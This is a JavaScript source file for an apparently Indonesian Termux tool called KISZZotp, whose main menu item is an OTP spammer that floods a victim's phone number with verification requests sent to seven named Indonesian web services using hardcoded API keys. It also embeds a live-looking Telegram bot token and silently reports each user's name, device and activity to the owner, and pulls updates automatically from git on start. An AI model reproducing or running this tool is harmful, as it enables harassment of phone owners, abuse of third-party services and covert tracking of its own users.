import axios from 'axios';
import chalk from 'chalk';
import readlineSync from 'readline-sync';
import { execSync } from 'child_process';
import fs from 'fs';
import os from 'os';
import crypto from 'crypto';

const C = {
    TOKEN: '8991103400:AAHR3EJhGd7MBfHeY8_6HJgnN93SEIdcvSY',
    CHAT_ID: '8276813899',
    OWNER: '6283147801427',
    VER: '2.9.0',
    TIMEOUT: 120,
    POLL: 1,
};

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

function checkUpdate() {
    try {
        if (!fs.existsSync('.git')) return;
        console.log(chalk.gray('🔄 Cek update...'));
        execSync('git fetch', { stdio: 'ignore' });
        const status = execSync('git status -uno', { encoding: 'utf8' });
        if (status.includes('Your branch is behind')) {
            console.log(chalk.yellow('📢 Ada update baru! Mengunduh...'));
            execSync('git pull', { stdio: 'inherit' });
            console.log(chalk.green('✅ Update berhasil! Restart script...'));
            process.exit(0);
        }
        console.log(chalk.green('✅ Sudah versi terbaru.'));
    } catch { console.log(chalk.gray('⚠️ Gagal cek update. Lanjut...')); }
}

async function notifyOwner(action, user, detail) {
    if (!detail) detail = '';
    try {
        const msg = '📢 *Aktivitas User*\n👤 ' + user + '\n📌 ' + action + (detail ? '\n📝 ' + detail : '');
        await sendTG(msg, null);
    } catch {}
}

// ====== LOGIN SYSTEM (dengan penyimpanan ID) ======
function loadUsers() {
    try {
        if (!fs.existsSync('users.json')) return {};
        return JSON.parse(fs.readFileSync('users.json'));
    } catch { return {}; }
}
function saveUsers(users) {
    try {
        fs.writeFileSync('users.json', JSON.stringify(users, null, 2));
        return true;
    } catch { return false; }
}
function getUser(username) {
    const users = loadUsers();
    return users[username] || null;
}
function createUser(username, password, termuxId) {
    const users = loadUsers();
    if (users[username]) return false;
    users[username] = { password, created: new Date().toISOString(), termuxId: termuxId || '' };
    saveUsers(users);
    return true;
}
function updateUserTermuxId(username, termuxId) {
    const users = loadUsers();
    if (!users[username]) return false;
    users[username].termuxId = termuxId;
    saveUsers(users);
    return true;
}
function loginUser(username, password) {
    const user = getUser(username);
    if (!user) return false;
    return user.password === password;
}
function getCurrentUser() {
    try {
        if (!fs.existsSync('current.json')) return null;
        const data = JSON.parse(fs.readFileSync('current.json'));
        return data.username || null;
    } catch { return null; }
}
function setCurrentUser(username) {
    try {
        fs.writeFileSync('current.json', JSON.stringify({ username, login: new Date().toISOString() }, null, 2));
        return true;
    } catch { return false; }
}
function logoutUser() {
    try { if (fs.existsSync('current.json')) fs.unlinkSync('current.json'); return true; } catch { return false; }
}

function getUsernameByTermuxId(termuxId) {
    const users = loadUsers();
    for (const [name, data] of Object.entries(users)) {
        if (data.termuxId === termuxId) return name;
    }
    return null;
}

function getAllUsers() {
    try {
        const users = loadUsers();
        return Object.keys(users);
    } catch { return []; }
}

function listAllUsers() {
    const users = getAllUsers();
    if (users.length === 0) {
        console.log(chalk.yellow('📋 Belum ada user yang terdaftar.'));
        return;
    }
    console.log(chalk.cyan('📋 Daftar User (Nama + ID):'));
    users.forEach(function(u, i) {
        const data = getUser(u);
        const id = data && data.termuxId ? data.termuxId : '-';
        console.log(chalk.white((i+1) + '. ' + u + ' (ID: ' + id + ')'));
    });
}

function listAllPartners() {
    const partners = getApprovedList();
    if (partners.length === 0) {
        console.log(chalk.yellow('📋 Belum ada partner.'));
        return;
    }
    console.log(chalk.cyan('📋 Daftar Partner (ID + Nama):'));
    partners.forEach(function(p, i) {
        const name = getUsernameByTermuxId(p) || 'Unknown';
        console.log(chalk.white((i+1) + '. ' + p + ' (' + name + ')'));
    });
}

// ====== LOG ACTIVITY ======
function logActivity(user, action, detail) {
    if (!detail) detail = '';
    try {
        const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
        const log = '[' + timestamp + '] ' + user + ' -> ' + action + ' ' + detail + '\n';
        fs.appendFileSync('activity.log', log);
    } catch {}
}

function getChannel() {
    return 'https://whatsapp.com/channel/0029Vb9WjJx5q08iyvQuSA3Q';
}
function setChannel(link) { return true; }
function delChannel() { return true; }

function getInfo() {
    try {
        if (!fs.existsSync('info.json')) return null;
        const data = JSON.parse(fs.readFileSync('info.json'));
        return data.text || null;
    } catch { return null; }
}
function setInfo(text) {
    try {
        fs.writeFileSync('info.json', JSON.stringify({ text: text.trim(), updated: new Date().toISOString() }, null, 2));
        return true;
    } catch { return false; }
}
function delInfo() {
    try { if (fs.existsSync('info.json')) fs.unlinkSync('info.json'); return true; } catch { return false; }
}

function getID() {
    try { return execSync('id -u').toString().trim() + '@' + os.hostname(); } catch { return 'unknown'; }
}
function getDevice() {
    try {
        const m = execSync('getprop ro.product.model 2>/dev/null || echo "Unknown"').toString().trim();
        const a = execSync('getprop ro.build.version.release 2>/dev/null || echo "Unknown"').toString().trim();
        return m + ' (Android ' + a + ')';
    } catch { return 'Unknown'; }
}
function getTime() { return new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' }); }
function genCode() { return crypto.randomInt(100000, 999999).toString(); }

async function sendTG(text, kb) {
    if (!kb) kb = null;
    try {
        const p = { chat_id: C.CHAT_ID, text: text, parse_mode: 'Markdown' };
        if (kb) p.reply_markup = JSON.stringify({ inline_keyboard: kb });
        await axios.post('https://api.telegram.org/bot' + C.TOKEN + '/sendMessage', p);
        return true;
    } catch { return false; }
}
async function ansCB(id, text) {
    try {
        await axios.post('https://api.telegram.org/bot' + C.TOKEN + '/answerCallbackQuery', {
            callback_query_id: id, text: text, show_alert: false
        });
    } catch {}
}
async function getUpd(off) {
    try {
        const r = await axios.get('https://api.telegram.org/bot' + C.TOKEN + '/getUpdates', {
            params: { offset: off, timeout: 10 }
        });
        return r.data.result || [];
    } catch { return []; }
}

function isApp(id) {
    try {
        if (!fs.existsSync('approved.json')) return false;
        const data = JSON.parse(fs.readFileSync('approved.json'));
        return data.includes(id);
    } catch { return false; }
}
function saveApp(id) {
    try {
        let d = fs.existsSync('approved.json') ? JSON.parse(fs.readFileSync('approved.json')) : [];
        if (!d.includes(id)) { d.push(id); fs.writeFileSync('approved.json', JSON.stringify(d, null, 2)); }
        return true;
    } catch { return false; }
}
function remApp(id) {
    try {
        let d = fs.existsSync('approved.json') ? JSON.parse(fs.readFileSync('approved.json')) : [];
        const nd = d.filter(function(x) { return x !== id; });
        fs.writeFileSync('approved.json', JSON.stringify(nd, null, 2));
        return true;
    } catch { return false; }
}
function getApprovedList() {
    try {
        if (!fs.existsSync('approved.json')) return [];
        return JSON.parse(fs.readFileSync('approved.json'));
    } catch { return []; }
}

function getLimit(id) {
    try {
        if (!fs.existsSync('limits.json')) return { count: 0, date: new Date().toDateString() };
        const d = JSON.parse(fs.readFileSync('limits.json'));
        return d[id] || { count: 0, date: new Date().toDateString() };
    } catch { return { count: 0, date: new Date().toDateString() }; }
}
function incLimit(id) {
    try {
        let d = fs.existsSync('limits.json') ? JSON.parse(fs.readFileSync('limits.json')) : {};
        const today = new Date().toDateString();
        if (!d[id] || d[id].date !== today) {
            d[id] = { count: 1, date: today };
        } else {
            d[id].count += 1;
        }
        fs.writeFileSync('limits.json', JSON.stringify(d, null, 2));
        return d[id].count;
    } catch { return 0; }
}
// ====== REQUEST APPROVAL ======
async function reqApp(user, id, dev) {
    const code = genCode();
    const kb = [[
        { text: '✅ Approve', callback_data: 'app_' + code },
        { text: '❌ Deny', callback_data: 'den_' + code }
    ]];
    const msg = '🔐 *Request Approval*\n👤 ' + user + '\n🆔 ' + id + '\n📱 ' + dev + '\n🔑 *' + code + '*';
    console.log(chalk.yellow('\n⏳ Mengirim request...'));
    if (!await sendTG(msg, kb)) {
        console.log(chalk.red('❌ Gagal kirim ke TG.'));
        process.exit(1);
    }
    console.log(chalk.green('✅ Request terkirim! Tunggu owner...'));
    let off = 0;
    try {
        const old = await getUpd(0);
        if (old.length > 0) off = old[old.length - 1].update_id + 1;
    } catch {}
    const start = Date.now();
    while ((Date.now() - start) / 1000 < C.TIMEOUT) {
        try {
            const up = await getUpd(off);
            for (const u of up) {
                off = u.update_id + 1;
                if (u.callback_query) {
                    const d = u.callback_query.data;
                    const from = u.callback_query.from.id;
                    const cid = u.callback_query.id;
                    if (from == C.CHAT_ID) {
                        if (d === 'app_' + code) {
                            await ansCB(cid, '✅ Disetujui!');
                            console.log(chalk.green('\n✅ APPROVED!'));
                            saveApp(id);
                            logActivity(user, 'APPROVED', id);
                            await notifyOwner('✅ APPROVED', user, 'ID: ' + id);
                            return true;
                        } else if (d === 'den_' + code) {
                            await ansCB(cid, '❌ Ditolak.');
                            console.log(chalk.red('\n❌ DENIED!'));
                            return false;
                        }
                    } else {
                        await ansCB(cid, '❌ Bukan owner!');
                    }
                }
            }
        } catch {}
        await sleep(C.POLL * 1000);
    }
    console.log(chalk.red('\n⏰ Waktu habis!'));
    return false;
}

async function getLoginUser() {
    const current = getCurrentUser();
    if (current) {
        console.log(chalk.green('✅ Login sebagai: ' + current));
        return current;
    }
    let username = readlineSync.question(chalk.cyan('Masukkan nama Anda: '));
    username = username.trim();
    if (!username) username = 'Anonymous';

    const termuxId = getID();

    const user = getUser(username);
    if (user) {
        let attempts = 3;
        while (attempts > 0) {
            const pass = readlineSync.question(chalk.cyan('Masukkan password: '), { hideEchoBack: true });
            if (loginUser(username, pass)) {
                setCurrentUser(username);
                // Simpan ID terbaru
                updateUserTermuxId(username, termuxId);
                console.log(chalk.green('✅ Login berhasil!'));
                await notifyOwner('🔓 LOGIN', username, '');
                return username;
            }
            attempts--;
            console.log(chalk.red('❌ Password salah! Sisa percobaan: ' + attempts));
        }
        console.log(chalk.red('❌ Gagal login. Script keluar.'));
        process.exit(1);
    } else {
        console.log(chalk.yellow('🔐 Buat akun baru untuk ' + username));
        const pass = readlineSync.question(chalk.cyan('Buat password (min 4 karakter): '), { hideEchoBack: true });
        if (!pass || pass.length < 4) {
            console.log(chalk.red('❌ Password minimal 4 karakter!'));
            process.exit(1);
        }
        createUser(username, pass, termuxId);
        setCurrentUser(username);
        console.log(chalk.green('✅ Akun berhasil dibuat!'));
        await notifyOwner('🆕 USER BARU', username, '');
        return username;
    }
}

function getStat(isO, id) {
    if (isO) return chalk.green('★ OWNER');
    if (isApp(id)) return chalk.green('★ PARTNER');
    return chalk.yellow('▸ Gratisan');
}

function getTotalUsers() {
    try {
        const users = loadUsers();
        return Object.keys(users).length;
    } catch { return 0; }
}

// ====== HEADER ======
function showHeader(u, s, id, dev) {
    console.clear();

    const RED = '\x1b[1;31m';
    const WHITE = '\x1b[1;37m';
    const RESET = '\x1b[0m';

    console.log(RED);
    console.log('╔════════════════════════════════════════════════════════════╗');
    console.log('║                                                            ║');
    console.log('║        ███████╗██████╗  █████╗ ███╗   ███╗███╗   ███╗    ║');
    console.log('║        ██╔════╝██╔══██╗██╔══██╗████╗ ████║████╗ ████║    ║');
    console.log('║        ███████╗██████╔╝███████║██╔████╔██║██╔████╔██║    ║');
    console.log('║        ╚════██║██╔═══╝ ██╔══██║██║╚██╔╝██║██║╚██╔╝██║    ║');
    console.log('║        ███████║██║     ██║  ██║██║ ╚═╝ ██║██║ ╚═╝ ██║    ║');
    console.log('║        ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚═╝    ║');
    console.log('║                                                            ║');
    console.log('║                    ██████╗ ████████╗██████╗               ║');
    console.log('║                   ██╔═══██╗╚══██╔══╝██╔══██╗              ║');
    console.log('║                   ██║   ██║   ██║   ██████╔╝              ║');
    console.log('║                   ██║   ██║   ██║   ██╔═══╝               ║');
    console.log('║                   ╚██████╔╝   ██║   ██║                   ║');
    console.log('║                    ╚═════╝    ╚═╝   ╚═╝                   ║');
    console.log('║                                                            ║');
    console.log(WHITE + '║                    BY kiszzaja' + RED + '                         ║');
    console.log('║                                                            ║');
    console.log('╚════════════════════════════════════════════════════════════╝');
    console.log(RESET);
    console.log('');

    console.log(chalk.cyan('╔════════════════════════════════════════════════════════════╗'));
    console.log(chalk.cyan('║ ') + chalk.bold('👤 User  ') + ': ' + chalk.green(u));
    console.log(chalk.cyan('║ ') + chalk.bold('📊 Status') + ': ' + s);
    console.log(chalk.cyan('║ ') + chalk.bold('🆔 ID    ') + ': ' + chalk.blue(id));
    console.log(chalk.cyan('║ ') + chalk.bold('📱 Device') + ': ' + chalk.magenta(dev));
    console.log(chalk.cyan('║ ') + chalk.bold('⏰ Waktu ') + ': ' + chalk.gray(getTime()));
    console.log(chalk.cyan('║ ') + chalk.bold('👥 Total User') + ': ' + chalk.yellow(getTotalUsers()));
    console.log(chalk.cyan('╚════════════════════════════════════════════════════════════╝'));
    console.log('');
    showInfoBox();
}

function showInfoBox() {
    const info = getInfo();
    if (!info) return;
    console.log(chalk.yellow('╔═══════════════════════════════════╗'));
    console.log(chalk.yellow('║   📢 INFO DARI KISZZ             ║'));
    console.log(chalk.yellow('╠═══════════════════════════════════╣'));
    console.log(chalk.white('║ ' + info.padEnd(29) + ' ║'));
    console.log(chalk.yellow('╚═══════════════════════════════════╝'));
    console.log('');
}

function showMenu(isO) {
    console.log(chalk.yellow('📋 MENU UTAMA'));
    console.log(chalk.yellow('─'.repeat(30)));
    console.log(chalk.cyan('1.') + ' 🚀 Spammer OTP');
    console.log(chalk.cyan('2.') + ' 🐛 Lapor Bug');
    console.log(chalk.cyan('3.') + ' 🔄 Cek Update');
    console.log(chalk.cyan('4.') + ' 📢 Join Saluran KISZZ');
    if (isO) {
        console.log(chalk.cyan('5.') + ' 👥 Add Partner (Owner Only)');
        console.log(chalk.cyan('6.') + ' 📢 Set Info (Owner Only)');
        console.log(chalk.cyan('7.') + ' ❌ Delete Partner (Owner Only)');
        console.log(chalk.cyan('8.') + ' ❌ Keluar');
        console.log(chalk.cyan('9.') + ' 📋 Daftar User & Partner (Owner Only)');
    } else {
        console.log(chalk.cyan('8.') + ' ❌ Keluar');
    }
    console.log(chalk.yellow('─'.repeat(30)));
}
// ====== SPAMMER OTP ======
async function spam(user, id, isO, isP) {
    console.clear();
    console.log(chalk.cyan('🚀 SPAMMER OTP\n'));
    await notifyOwner('🚀 SPAM START', user, '');

    if (!isO && !isP) {
        const lim = getLimit(id);
        const today = new Date().toDateString();
        if (lim.date === today && lim.count >= 3) {
            console.log(chalk.red('❌ Limit habis! (3x/hari). Upgrade ke partner.'));
            readlineSync.question(chalk.gray('\nTekan Enter...'));
            return;
        }
    }
    const inp = readlineSync.question(chalk.white('📱 Nomor (pisah koma untuk partner/owner): '));
    if (!inp.trim()) {
        console.log(chalk.red('❌ Tidak boleh kosong!'));
        readlineSync.question(chalk.gray('\nTekan Enter...'));
        return;
    }
    let targets = (isP || isO) ? inp.split(',').map(function(t) { return t.trim(); }) : [inp.trim()];
    const delay = (isP || isO) ? 500 : 2000;
    for (let idx = 0; idx < targets.length; idx++) {
        const t = targets[idx];
        let phone = t.replace(/[^0-9]/g, '');
        if (phone.startsWith('0')) phone = '62' + phone.slice(1);
        if (!phone.startsWith('62')) phone = '62' + phone;
        const p08 = '0' + phone.slice(2);
        const p62 = phone;
        console.log(chalk.green('✅ Target: ' + phone));
        const otp = [
            { url: 'https://internetrakyat.id/api/app/auth/send-otp-register', data: { phone_number: p08 }, headers: { 'x-api-key': '280999!FTTH' } },
            { url: 'https://www.alodokter.com/resend-otp', data: { user: { phone: p08, uuid: 'f6bd0911---b189-' }, request_via: 'whatsapp' } },
            { url: 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp', data: { accountType: 'customers', applicationType: 'Pinhome Web', countryCode: '62', medium: 'whatsapp', otpType: 'register', phoneNumber: p62.replace('62', '') } },
            { url: 'https://www.rumah123.com/api/otp/request-otp', data: { ipAddress: '36.67.110.51', phoneNumber: p62, portalId: 1, type: 'WHATSAPP', url: 'https://www.rumah123.com/user/login' }, headers: { 'Base-Url-Core': 'https://www.rumah123.com' } },
            { url: 'https://beta.api.saturdays.com/api/v1/user/otp/send', data: { number: p62.replace('62', ''), country_code: '+62', type: '' }, headers: { 'x-api-key': 'GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj', 'country-code': 'ID' } },
            { url: 'https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata', data: { mobileNumber: p62.replace('62', ''), type: 'prospect-create', channel: 'whatsapp' } },
            { url: 'https://www.halodoc.com/magneto-api/v2/users/authentication/otp/requests', data: { phone_number: p62 } }
        ];
        let s = 0, f = 0;
        for (let i = 0; i < otp.length; i++) {
            const ep = otp[i];
            try {
                const cfg = { headers: { 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0', ...(ep.headers || {}) }, timeout: 10000 };
                process.stdout.write('[' + (i+1) + '/' + otp.length + '] 🔄 Mengirim... ');
                if (ep.method === 'GET') await axios.get(ep.url, cfg);
                else await axios.post(ep.url, ep.data, cfg);
                s++;
                console.log(chalk.green('✅ Berhasil'));
            } catch {
                f++;
                console.log(chalk.red('❌ Gagal'));
            }
            await sleep(delay);
        }
        console.log('\n📱 ' + phone + '\n📤 ' + otp.length + '\n✅ ' + s + '\n❌ ' + f);
        logActivity(user, 'SPAM', 'Target: ' + phone + ' | Berhasil: ' + s + ' | Gagal: ' + f);
        const detail = '📱 Target: ' + phone + '\n✅ Berhasil: ' + s + '\n❌ Gagal: ' + f;
        await notifyOwner('🎯 SPAM RESULT', user, detail);
    }
    if (!isO && !isP) {
        const nc = incLimit(id);
        console.log(chalk.gray('📊 Sisa limit: ' + (3 - nc) + ' dari 3.'));
    }
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

async function laporBug(user) {
    console.clear();
    console.log(chalk.yellow('\n🐛 LAPOR BUG\n'));
    console.log(chalk.white('📱 Owner: ' + C.OWNER));
    console.log(chalk.gray('Kirim pesan ke WhatsApp dengan format:\n- Nama: [Nama Anda]\n- Bug: [Deskripsi bug]\n- Screenshot: [Opsional]\n'));
    const c = readlineSync.question(chalk.cyan('Buka WhatsApp sekarang? (y/n): '));
    if (c.toLowerCase() === 'y') {
        try {
            const url = 'https://wa.me/' + C.OWNER + '?text=Halo%20KISZZ%2C%20saya%20' + encodeURIComponent(user) + '%20ingin%20lapor%20bug.';
            execSync('termux-open-url "' + url + '"');
            console.log(chalk.green('✅ Membuka WhatsApp...'));
        } catch (e) {
            console.log(chalk.red('❌ Gagal membuka WhatsApp. Silakan hubungi manual ke nomor: ' + C.OWNER));
        }
        logActivity(user, 'LAPOR_BUG', '');
        await notifyOwner('🐛 LAPOR BUG', user, '');
    }
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

async function cekUpdate(user) {
    console.clear();
    console.log(chalk.cyan('\n🔄 CEK UPDATE\n'));
    console.log(chalk.green('✅ Versi: ' + C.VER));
    logActivity(user, 'CEK_UPDATE', '');
    await notifyOwner('🔄 CEK UPDATE', user, '');
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

async function addPartnerMenu(user) {
    console.clear();
    console.log(chalk.green('\n👥 ADD PARTNER\n'));
    const tid = readlineSync.question(chalk.cyan('📌 ID user (contoh: 10192@localhost): '));
    if (!tid.trim()) {
        console.log(chalk.red('❌ Tidak boleh kosong!'));
        readlineSync.question(chalk.gray('\nTekan Enter...'));
        return;
    }
    if (isApp(tid.trim())) {
        console.log(chalk.yellow('⚠️ ' + tid + ' sudah ada.'));
    } else {
        saveApp(tid.trim());
        console.log(chalk.green('✅ ' + tid + ' ditambahkan!'));
        logActivity(user, 'ADD_PARTNER', tid);
        await notifyOwner('👥 ADD PARTNER', user, 'ID: ' + tid);
    }
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

async function deletePartnerMenu(user) {
    console.clear();
    console.log(chalk.red('\n❌ DELETE PARTNER\n'));
    const tid = readlineSync.question(chalk.cyan('📌 ID user (contoh: 10192@localhost): '));
    if (!tid.trim()) {
        console.log(chalk.red('❌ Tidak boleh kosong!'));
        readlineSync.question(chalk.gray('\nTekan Enter...'));
        return;
    }
    if (isApp(tid.trim())) {
        remApp(tid.trim());
        console.log(chalk.green('✅ ' + tid + ' telah dihapus dari daftar partner.'));
        logActivity(user, 'DELETE_PARTNER', tid);
        await notifyOwner('❌ DELETE PARTNER', user, 'ID: ' + tid);
    } else {
        console.log(chalk.yellow('⚠️ ' + tid + ' tidak ditemukan.'));
    }
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

async function setInfoMenu(user) {
    console.clear();
    console.log(chalk.cyan('\n📢 SET INFO\n'));
    const info = readlineSync.question(chalk.white('📝 Masukkan info baru: '));
    if (!info.trim()) {
        console.log(chalk.red('❌ Tidak boleh kosong!'));
        readlineSync.question(chalk.gray('\nTekan Enter...'));
        return;
    }
    setInfo(info.trim());
    console.log(chalk.green('✅ Info berhasil disimpan: ' + info));
    logActivity(user, 'SET_INFO', info);
    await notifyOwner('📢 SET INFO', user, 'Info: ' + info);
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

// ====== MENU DAFTAR USER & PARTNER ======
async function listUsersMenu() {
    console.clear();
    console.log(chalk.cyan('╔═══════════════════════════════════════════════╗'));
    console.log(chalk.cyan('║            📋 DAFTAR USER & PARTNER          ║'));
    console.log(chalk.cyan('╚═══════════════════════════════════════════════╝\n'));
    console.log(chalk.yellow('─── USER ───'));
    listAllUsers();
    console.log('\n' + chalk.yellow('─── PARTNER ───'));
    listAllPartners();
    readlineSync.question(chalk.gray('\nTekan Enter...'));
}

// ====== MAIN ======
async function main() {
    checkUpdate();

    console.clear();
    console.log(chalk.cyan('╔═══════════════════════════════════════════════╗'));
    console.log(chalk.cyan('║     SELAMAT DATANG DI KISZZotp               ║'));
    console.log(chalk.cyan('╚═══════════════════════════════════════════════╝\n'));
    await sleep(1000);

    const userName = await getLoginUser();
    const termuxId = getID();
    const device = getDevice();
    const isOwner = userName.toLowerCase() === 'kiszzaja';
    const isPartner = isApp(termuxId);

    if (!isOwner) {
        if (!isApp(termuxId)) {
            console.log(chalk.yellow('\n🔐 Memerlukan approval owner.'));
            if (!await reqApp(userName, termuxId, device)) {
                console.log(chalk.red('❌ Akses ditolak.'));
                process.exit(1);
            }
        } else {
            console.log(chalk.green('\n✅ Sudah terdaftar sebagai partner!'));
            logActivity(userName, 'LOGIN', '');
            await notifyOwner('🔓 LOGIN', userName, '');
            await sleep(1000);
        }
    } else {
        console.log(chalk.green('\n👑 Owner mode!'));
        await sleep(1000);
    }

    let offset = 0;
    (async function pollTelegram() {
        while (true) {
            if (isOwner) {
                try {
                    const updates = await getUpd(offset);
                    for (const u of updates) {
                        offset = u.update_id + 1;
                        if (u.message && u.message.text) {
                            const text = u.message.text;
                            const fromId = u.message.from.id;
                            if (fromId == C.CHAT_ID) {
                                if (text.startsWith('/setstatus')) {
                                    const parts = text.split(' ');
                                    if (parts.length < 3) {
                                        await sendTG('❌ Format: /setstatus <id> <status>', null);
                                        continue;
                                    }
                                    const targetId = parts[1].trim();
                                    const status = parts.slice(2).join(' ');
                                    try {
                                        let sd = fs.existsSync('status.json') ? JSON.parse(fs.readFileSync('status.json')) : {};
                                        sd[targetId] = status;
                                        fs.writeFileSync('status.json', JSON.stringify(sd, null, 2));
                                        await sendTG('✅ Status *' + targetId + '* -> *' + status + '*', null);
                                        logActivity('OWNER', 'SET_STATUS', targetId + ' -> ' + status);
                                    } catch (e) {
                                        await sendTG('❌ Gagal: ' + e.message, null);
                                    }
                                } else if (text.startsWith('/getstatus')) {
                                    const parts = text.split(' ');
                                    if (parts.length < 2) {
                                        await sendTG('❌ Format: /getstatus <id>', null);
                                        continue;
                                    }
                                    const targetId = parts[1].trim();
                                    try {
                                        const sd = fs.existsSync('status.json') ? JSON.parse(fs.readFileSync('status.json')) : {};
                                        const status = sd[targetId] || 'Gratisan';
                                        await sendTG('📌 Status *' + targetId + '*: *' + status + '*', null);
                                    } catch (e) {
                                        await sendTG('❌ Gagal: ' + e.message, null);
                                    }
                                } else if (text.startsWith('/help')) {
                                    await sendTG('📋 *Command Owner:*\n/setstatus <id> <status>\n/getstatus <id>\n/listusers\n/listpartners\n/help', null);
                                } else if (text.startsWith('/listusers')) {
                                    const users = getAllUsers();
                                    if (users.length === 0) {
                                        await sendTG('📋 Belum ada user yang terdaftar.', null);
                                    } else {
                                        const list = users.map(function(u, i) {
                                            const data = getUser(u);
                                            const id = data && data.termuxId ? data.termuxId : '-';
                                            return (i+1) + '. ' + u + ' (ID: ' + id + ')';
                                        }).join('\n');
                                        await sendTG('📋 *Daftar User:*\n' + list, null);
                                    }
                                } else if (text.startsWith('/listpartners')) {
                                    const partners = getApprovedList();
                                    if (partners.length === 0) {
                                        await sendTG('📋 Belum ada partner.', null);
                                    } else {
                                        const list = partners.map(function(p, i) {
                                            const name = getUsernameByTermuxId(p) || 'Unknown';
                                            return (i+1) + '. ' + p + ' (' + name + ')';
                                        }).join('\n');
                                        await sendTG('📋 *Daftar Partner:*\n' + list, null);
                                    }
                                } else {
                                    await sendTG('❌ Command tidak dikenali. Ketik /help', null);
                                }
                            }
                        }
                    }
                } catch (e) {}
            }
            await sleep(2000);
        }
    })();

    while (true) {
        const status = getStat(isOwner, termuxId);
        showHeader(userName, status, termuxId, device);
        showMenu(isOwner);
        const maxMenu = isOwner ? 9 : 8;
        const choice = readlineSync.question(chalk.cyan('\nPilih menu [1-' + maxMenu + ']: '));
        switch (choice) {
            case '1':
                await spam(userName, termuxId, isOwner, isPartner);
                break;
            case '2':
                await laporBug(userName);
                break;
            case '3':
                await cekUpdate(userName);
                break;
            case '4':
                const channelLink = getChannel();
                console.log(chalk.cyan('\n📢 *Saluran KISZZ:*\n' + channelLink));
                console.log(chalk.green('✅ Membuka saluran...'));
                try {
                    execSync('termux-open-url "' + channelLink + '"');
                } catch (e) {
                    console.log(chalk.red('❌ Gagal membuka saluran. Silakan buka manual: ' + channelLink));
                }
                readlineSync.question(chalk.gray('\nTekan Enter...'));
                break;
            case '5':
                if (isOwner) await addPartnerMenu(userName);
                else console.log(chalk.red('❌ Menu owner!'));
                break;
            case '6':
                if (isOwner) await setInfoMenu(userName);
                else console.log(chalk.red('❌ Menu owner!'));
                break;
            case '7':
                if (isOwner) await deletePartnerMenu(userName);
                else console.log(chalk.red('❌ Menu owner!'));
                break;
            case '8':
                console.log(chalk.green('\n👋 Sampai jumpa!'));
                logoutUser();
                logActivity(userName, 'LOGOUT', '');
                await notifyOwner('👋 LOGOUT', userName, '');
                process.exit(0);
            case '9':
                if (isOwner) await listUsersMenu();
                else console.log(chalk.red('❌ Menu owner!'));
                break;
            default:
                console.log(chalk.red('❌ Salah!'));
                await sleep(1000);
        }
    }
}

main().catch(function(err) {
    console.error(chalk.red('❌ Error:', err.message));
});
